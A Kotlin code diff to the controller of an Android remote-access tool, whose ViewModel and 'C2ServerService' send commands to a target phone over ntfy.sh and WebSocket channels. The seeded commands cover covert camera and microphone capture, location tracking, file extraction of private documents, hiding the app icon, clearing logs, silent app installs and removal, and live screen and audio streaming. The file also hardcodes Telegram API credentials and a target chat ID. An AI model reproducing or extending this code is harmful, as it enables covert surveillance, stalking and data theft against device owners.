@@ -18,6 +18,7 @@ import android.os.Environment
 import android.widget.Toast
 import androidx.compose.runtime.getValue
 import androidx.compose.runtime.mutableStateListOf
+import androidx.compose.runtime.mutableStateMapOf
 import androidx.compose.runtime.mutableStateOf
 import androidx.compose.runtime.setValue
 import androidx.lifecycle.AndroidViewModel
@@ -52,7 +53,7 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 
-data class QueuedCommand(val uiKey: String, val cmd: String, val arg: String)
+data class QueuedCommand(val uiKey: String, val cmd: String, val arg: String, val isLive: Boolean = false)
 
 data class AppSettings(
     val ntfyUrl: String, val ntfyTopic: String, val serverIp: String, val port: String,
@@ -81,6 +82,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     private var commandQueue = Channel<QueuedCommand>(Channel.UNLIMITED)
     private var workerJob: Job? = null
     private val isNetworkAvailable = MutableStateFlow(true)
+    val toggleStates = mutableStateMapOf<String, Boolean>() // UI toggle states
 
     var remoteVideoTrack by mutableStateOf<VideoTrack?>(null)
 
@@ -109,7 +111,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         viewModelScope.launch(Dispatchers.IO) {
             commandDao.getAllCommands().collect { list ->
                 if (list.isEmpty()) seedDefaultCommands()
-                else _commands.value = list
+                else _commands.value = list.sortedBy { it.label } // Sort alphabetically initially
             }
         }
 
@@ -134,7 +136,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         return AppSettings(
             ntfyUrl = prefs.getString("ntfyUrl", "https://ntfy.sh") ?: "https://ntfy.sh",
             ntfyTopic = prefs.getString("ntfyTopic", "sys_linker_initial_comm_channel_xyz789") ?: "sys_linker_initial_comm_channel_xyz789",
-            serverIp = prefs.getString("serverIp", "0.0.0.0") ?: "0.0.0.0",
+            serverIp = prefs.getString("serverIp", "0.0.0.0") ?: "0.0.0.0", // This is local Ktor binding. Actual public IP needs external lookup.
             port = prefs.getInt("port", 8765).toString(),
             apiId = prefs.getInt("tdApiId", 25029226).toString(),
             apiHash = prefs.getString("tdApiHash", "9943012755ea9fab57b4f7e42eeb99c6") ?: "9943012755ea9fab57b4f7e42eeb99c6",
@@ -166,13 +168,13 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     }
 
     private fun startQueueWorkers() {
-        workerJob?.cancel()
-        commandQueue.cancel()
-        commandQueue = Channel(Channel.UNLIMITED)
-        _pendingCommands.value = emptySet()
+        workerJob?.cancel() // Cancel any previous workers
+        commandQueue.cancel() // Clear and close the old channel
+        commandQueue = Channel(Channel.UNLIMITED) // Create a new channel
+        _pendingCommands.value = emptySet() // Clear pending UI states
 
         workerJob = viewModelScope.launch(Dispatchers.IO) {
-            repeat(3) {
+            repeat(3) { workerId -> // Strictly 3 parallel executors
                 launch {
                     for (task in commandQueue) {
                         processTask(task)
@@ -185,73 +187,109 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     private suspend fun processTask(task: QueuedCommand) {
         var success = false
         while (!success) {
-            if (!_pendingCommands.value.contains(task.uiKey)) return
+            // Check if command was aborted by Kill Switch or explicit UI action
+            if (!_pendingCommands.value.contains(task.uiKey)) {
+                ServerCore.log("ABORTED: ${task.cmd} (${task.uiKey})", false)
+                return
+            }
 
-            isNetworkAvailable.first { it }
+            isNetworkAvailable.first { it } // Suspend until network is available
+
             try {
-                val url = prefs.getString("ntfyUrl", "https://ntfy.sh")!!
-                val topic = prefs.getString("ntfyTopic", "sys_linker_initial_comm_channel_xyz789")!!
-                val targetUrl = if (url.startsWith("http")) "${url.trimEnd('/')}/$topic" else "https://$url/${topic.trimEnd('/')}"
-                
-                val payload = if (task.arg.isNotBlank()) {
-                    """{"cmd": "${task.cmd.replace("\"", "\\\"")}", "arg": "${task.arg.replace("\"", "\\\"")}"}"""
-                } else {
-                    """{"cmd": "${task.cmd.replace("\"", "\\\"")}"}"""
-                }
+                if (task.isLive) { // Send via Ktor WebSocket
+                    val json = if(task.arg.isNotBlank()) """{"cmd":"${task.cmd}","arg":"${task.arg}"}""" else """{"cmd":"${task.cmd}"}"""
+                    ServerCore.liveSessions.forEach { session ->
+                        if (session.isActive) session.send(Frame.Text(json))
+                    }
+                    ServerCore.log("LIVE SENT: ${task.cmd}", true)
+                } else { // Send via Ntfy (HTTP POST)
+                    val url = prefs.getString("ntfyUrl", "https://ntfy.sh")!!
+                    val topic = prefs.getString("ntfyTopic", "sys_linker_initial_comm_channel_xyz789")!!
+                    val targetUrl = if (url.startsWith("http")) "${url.trimEnd('/')}/$topic" else "https://$url/${topic.trimEnd('/')}"
+                    
+                    val payload = if (task.arg.isNotBlank()) {
+                        """{"cmd": "${task.cmd.replace("\"", "\\\"")}", "arg": "${task.arg.replace("\"", "\\\"")}"}"""
+                    } else {
+                        """{"cmd": "${task.cmd.replace("\"", "\\\"")}"}"""
+                    }
 
-                httpClient.post(targetUrl) { setBody(payload) }
+                    httpClient.post(targetUrl) { setBody(payload) }
+                    ServerCore.log("NTFY SENT: ${task.cmd}", true)
+                }
                 success = true
-                ServerCore.log("SENT: ${task.cmd}", true)
             } catch (e: Exception) {
-                ServerCore.log("NETWORK DROP: ${task.cmd} paused. Retrying...", false)
-                delay(3000)
+                ServerCore.log("NETWORK/LIVE ERROR: ${task.cmd} (${task.uiKey}) paused. Retrying...", false)
+                delay(3000) // Backoff before retry
             }
         }
-        _pendingCommands.update { it - task.uiKey }
+        _pendingCommands.update { it - task.uiKey } // Remove from pending after successful send
     }
 
-    fun executeCommand(cmd: String, arg: String = "", uiKey: String = cmd) {
+    // Command API
+    fun enqueueCommand(cmd: String, arg: String = "", uiKey: String = cmd, isLive: Boolean = false) {
         _pendingCommands.update { it + uiKey }
-        commandQueue.trySend(QueuedCommand(uiKey, cmd, arg))
-        ServerCore.log("QUEUED: $cmd")
+        commandQueue.trySend(QueuedCommand(uiKey, cmd, arg, isLive))
+        ServerCore.log("QUEUED: $cmd (Key: $uiKey)")
     }
 
     fun activateKillSwitch() {
-        ServerCore.log("KILL SWITCH ENGAGED: Purging command queue.", false)
-        startQueueWorkers()
+        ServerCore.log("KILL SWITCH ENGAGED: Purging command queue and resetting workers.", false)
+        startQueueWorkers() // Re-initializes everything, clearing queue and pending states
     }
 
     // --- Database Operations ---
-    fun addCommand(label: String, cmd: String, arg: String, icon: String) {
+    fun addCommand(command: CommandEntity) {
         viewModelScope.launch(Dispatchers.IO) {
-            commandDao.insertCommand(CommandEntity(label = label, cmd = cmd, defaultArg = arg, icon = icon))
+            commandDao.insertCommand(command)
+            ServerCore.log("Command saved: ${command.label}", true)
         }
     }
 
     fun deleteCommand(command: CommandEntity) {
         viewModelScope.launch(Dispatchers.IO) {
             commandDao.deleteCommand(command)
+            ServerCore.log("Command deleted: ${command.label}", true)
         }
     }
 
     private suspend fun seedDefaultCommands() {
         val defaults = listOf(
-            CommandEntity(label = "Ping Target", cmd = "ping", defaultArg = "", icon = "radar"),
-            CommandEntity(label = "Full Intel", cmd = "info", defaultArg = "", icon = "info"),
-            CommandEntity(label = "Dump Screen", cmd = "dump_screen", defaultArg = "", icon = "screenshot_monitor"),
-            CommandEntity(label = "Track Macro", cmd = "track_activity", defaultArg = "10, temp_macro", icon = "track_changes"),
-            CommandEntity(label = "Perform Macro", cmd = "perform", defaultArg = "2, 1, temp_macro", icon = "play_arrow"),
-            CommandEntity(label = "Workflow Send", cmd = "workflow", defaultArg = "default", icon = "account_tree"),
-            CommandEntity(label = "WF Status", cmd = "status_workflow", defaultArg = "default", icon = "description"),
-            CommandEntity(label = "Extract File", cmd = "send", defaultArg = "filename.txt", icon = "upload_file"),
-            CommandEntity(label = "Toggle Wi-Fi", cmd = "toggle_wifi", defaultArg = "on", icon = "wifi"),
-            CommandEntity(label = "Toggle Hotspot", cmd = "toggle_hotspot", defaultArg = "on", icon = "router"),
-            CommandEntity(label = "App Install", cmd = "install_app", defaultArg = "/sdcard/app.apk", icon = "system_update"),
-            CommandEntity(label = "App Uninstall", cmd = "uninstall_app", defaultArg = "com.whatsapp", icon = "delete_sweep"),
-            CommandEntity(label = "Hide Icon", cmd = "icon_hide", defaultArg = "", icon = "visibility_off"),
-            CommandEntity(label = "VoIP Call", cmd = "call", defaultArg = "nm, loud", icon = "phone"),
-            CommandEntity(label = "End Call", cmd = "end_call", defaultArg = "", icon = "phone_disabled"),
-            CommandEntity(label = "Download URL", cmd = "download_url", defaultArg = "{\"url\":\"https://...\"}", icon = "cloud_download")
+            // Quick Actions
+            CommandEntity(id=1, label = "Flash On", cmd = "flash", defaultArg = "on", icon = "flashlight_on", category = "Quick", isToggle = true, toggledLabel = "Flash Off", toggledCmd = "flash", toggledArg = "off"),
+            CommandEntity(id=2, label = "Cam Front", cmd = "cam_front", defaultArg = "", icon = "camera_front", category = "Quick"),
+            CommandEntity(id=3, label = "Cam Back", cmd = "cam_back", defaultArg = "", icon = "camera_rear", category = "Quick"),
+            CommandEntity(id=4, label = "Mic Record", cmd = "mic", defaultArg = "15", icon = "mic", category = "Quick"),
+            CommandEntity(id=5, label = "Location", cmd = "loc", defaultArg = "", icon = "location", category = "Quick"),
+            CommandEntity(id=6, label = "Volume 100%", cmd = "vol", defaultArg = "100", icon = "volume_up", category = "Quick", isToggle = true, toggledLabel = "Volume 0%", toggledCmd = "vol", toggledArg = "0"),
+
+            // System Directives
+            CommandEntity(id=10, label = "Ping Target", cmd = "ping", defaultArg = "", icon = "radar", category = "System"),
+            CommandEntity(id=11, label = "Full Intel", cmd = "info", defaultArg = "", icon = "info", category = "System"),
+            CommandEntity(id=12, label = "Extract Logs", cmd = "get_log", defaultArg = "", icon = "description", category = "System"),
+            CommandEntity(id=13, label = "Clear Logs", cmd = "clear_log", defaultArg = "", icon = "delete_sweep", category = "System"),
+            CommandEntity(id=14, label = "Hide Icon", cmd = "icon_hide", defaultArg = "", icon = "visibility_off", category = "System", isToggle = true, toggledLabel = "Show Icon", toggledCmd = "icon_show", toggledArg = ""),
+            CommandEntity(id=15, label = "Toggle Wi-Fi", cmd = "toggle_wifi", defaultArg = "on", icon = "wifi", category = "System", isToggle = true, toggledLabel = "Toggle Wi-Fi", toggledCmd = "toggle_wifi", toggledArg = "off"),
+            CommandEntity(id=16, label = "Toggle Hotspot", cmd = "toggle_hotspot", defaultArg = "on", icon = "router", category = "System", isToggle = true, toggledLabel = "Toggle Hotspot", toggledCmd = "toggle_hotspot", toggledArg = "off"),
+            CommandEntity(id=17, label = "Scan Wi-Fi", cmd = "scan_wifi", defaultArg = "", icon = "network_wifi", category = "System"),
+            CommandEntity(id=18, label = "Scan Bluetooth", cmd = "scan_bt", defaultArg = "", icon = "bluetooth", category = "System"),
+
+            // App Management
+            CommandEntity(id=20, label = "App Install", cmd = "install_app", defaultArg = "/sdcard/app.apk", icon = "system_update", category = "App Mgmt"),
+            CommandEntity(id=21, label = "App Uninstall", cmd = "uninstall_app", defaultArg = "com.whatsapp", icon = "delete_sweep", category = "App Mgmt"),
+            CommandEntity(id=22, label = "Download URL", cmd = "download_url", defaultArg = "{\"url\":\"https://example.com/file.apk\", \"path\":\"/sdcard/download.apk\"}", icon = "cloud_download", category = "App Mgmt"),
+            CommandEntity(id=23, label = "Extract File", cmd = "send", defaultArg = "my_private_doc.pdf", icon = "upload_file", category = "App Mgmt"),
+            CommandEntity(id=24, label = "File Manager", cmd = "fm_ls", defaultArg = "/sdcard", icon = "folder", category = "App Mgmt"),
+
+            // Workflow & Automation
+            CommandEntity(id=30, label = "Dump Screen", cmd = "dump_screen", defaultArg = "", icon = "screenshot_monitor", category = "Automation"),
+            CommandEntity(id=31, label = "Track Macro", cmd = "track_activity", defaultArg = "10, temp_macro", icon = "track_changes", category = "Automation"),
+            CommandEntity(id=32, label = "Perform Macro", cmd = "perform", defaultArg = "2, 1, temp_macro", icon = "play_arrow", category = "Automation"),
+            CommandEntity(id=33, label = "Workflow Send", cmd = "workflow", defaultArg = "default", icon = "account_tree", category = "Automation"),
+            CommandEntity(id=34, label = "WF Status", cmd = "status_workflow", defaultArg = "default", icon = "description", category = "Automation"),
+            CommandEntity(id=35, label = "Halt Workflow", cmd = "halt_workflow", defaultArg = "all", icon = "stop", category = "Automation", isToggle = true, toggledLabel = "Resume Workflow", toggledCmd = "resume_workflow", toggledArg = "all"),
+
+            // Live Communications
+            CommandEntity(id=40, label = "VoIP Call", cmd = "call", defaultArg = "nm, loud", icon = "phone", category = "Live Comm", isToggle = true, toggledLabel = "End Call", toggledCmd = "end_call", toggledArg = ""),
         )
         defaults.forEach { commandDao.insertCommand(it) }
     }
@@ -263,14 +301,18 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                 remoteVideoTrack = stream.videoTracks[0]
             }
         }
-        executeCommand("start_webrtc", "", "live_rtc_init")
+        enqueueCommand("start_webrtc", "", "live_rtc_init", isLive = false) // Start WebRTC handshake via Ntfy
     }
 
     fun terminateWebRtcConnection() {
         webRtcManager.peerConnection?.close()
         webRtcManager.peerConnection = null
         remoteVideoTrack = null
-        sendLive("live_screen_cast", "stop")
+        // Also send a command to the client to stop its capturers
+        sendLive("live_screen_cast", "stop") // Stops screen capturer
+        sendLive("stream_cam_front", "stop") // Stops camera capturer
+        sendLive("stream_cam_back", "stop") // Stops camera capturer
+        sendLive("live_audio_mode", "off") // Stops audio capturer
     }
 
     fun tdLog(msg: String, type: String = "INFO") {
@@ -325,13 +367,14 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                     tdLog("Auth State Shift: ${update.authorizationState.javaClass.simpleName}", "INFO")
                     when (update.authorizationState) {
                         is TdApi.AuthorizationStateWaitTdlibParameters -> {
+                            val settings = getSettings() // Use current settings for init
                             val params = TdApi.SetTdlibParameters().apply {
                                 useTestDc = false
                                 databaseDirectory = File(appCtx.filesDir, "tdlib").absolutePath
                                 useMessageDatabase = true
                                 useSecretChats = true
-                                apiId = prefs.getInt("tdApiId", 25029226)
-                                apiHash = prefs.getString("tdApiHash", "9943012755ea9fab57b4f7e42eeb99c6")
+                                apiId = settings.apiId.toIntOrNull() ?: 25029226
+                                apiHash = settings.apiHash
                                 systemLanguageCode = "en"
                                 deviceModel = Build.MODEL
                                 applicationVersion = "1.0"
@@ -343,7 +386,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                         is TdApi.AuthorizationStateWaitPassword -> tdAuthState = TdAuthState.WAIT_PASSWORD
                         is TdApi.AuthorizationStateReady -> {
                             tdAuthState = TdAuthState.READY
-                            tgChatId = prefs.getLong("tdTargetChatId", 7956541572L)
+                            tgChatId = getSettings().chatId.toLongOrNull() ?: 7956541572L // Use current settings for chat ID
                             tdLog("Engine Authenticated. Target Chat ID: $tgChatId", "SUCCESS")
                             if (tgChatId != 0L) fetchChatHistory() else tdLog("Target Chat ID is 0. Cannot fetch history.", "WARN")
                         }
@@ -476,12 +519,16 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
             if (ServerCore.liveSessions.isNotEmpty()) {
                 val json = if(arg.isNotBlank()) """{"cmd":"$cmd","arg":"$arg"}""" else """{"cmd":"$cmd"}"""
                 ServerCore.liveSessions.forEach { try { it.send(Frame.Text(json)) } catch(e: Exception){} }
+            } else {
+                ServerCore.log("WARN: No live WebSocket sessions active to send command: $cmd", false)
             }
         }
     }
 
     fun toggleServer(context: Context) {
-        val intent = Intent(context, C2ServerService::class.java).apply { putExtra("port", prefs.getInt("port", 8765)) }
+        val currentSettings = getSettings()
+        val port = currentSettings.port.toIntOrNull() ?: 8765
+        val intent = Intent(context, C2ServerService::class.java).apply { putExtra("port", port) }
         if (ServerCore.isRunning) { context.stopService(intent) } else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent) }
     }
 }
